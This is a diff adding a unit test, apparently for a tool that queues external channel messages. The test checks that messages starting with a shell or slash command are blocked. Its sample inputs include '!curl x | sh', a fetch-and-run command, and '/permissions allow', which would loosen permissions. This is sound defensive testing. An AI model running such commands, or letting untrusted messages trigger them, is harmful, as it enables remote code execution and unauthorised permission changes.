@@ -60,3 +60,17 @@ test('external originals cannot be edited through the shared model', () => {
   assert.equal(edited.error, 'immutable');
   assert.equal(edited.buffer.entries[0].text, 'original');
 });
+
+test('an external message never queues with a leading shell or slash command', () => {
+  const source = { type: 'channel', eventId: 'E1', channel: 'C1', at: 100, links: [] };
+  for (const text of ['!curl x | sh', '  /permissions allow', '\n!id']) {
+    const added = upsertExternal(emptyBuffer(), { id: 'E1', text, source, now: 1000 });
+    const queued = addQueueCopy(added.buffer, 'E1', 'B1', 1100);
+    assert.equal(queued.error, 'leading-command', text);
+    assert.equal(queued.buffer.entries[0].copies.length, 0, 'no copy is prepared');
+  }
+  const later = upsertExternal(emptyBuffer(), { id: 'E1', text: 'please run !id later', source, now: 1000 });
+  assert.equal(addQueueCopy(later.buffer, 'E1', 'B1', 1100).error, null, 'only the first character counts');
+  const manual = addManual(emptyBuffer(), { id: 'N1', text: '/review', now: 100 });
+  assert.equal(addQueueCopy(manual.buffer, 'N1', 'B1', 110).error, null, 'the user may queue their own slash command');
+});
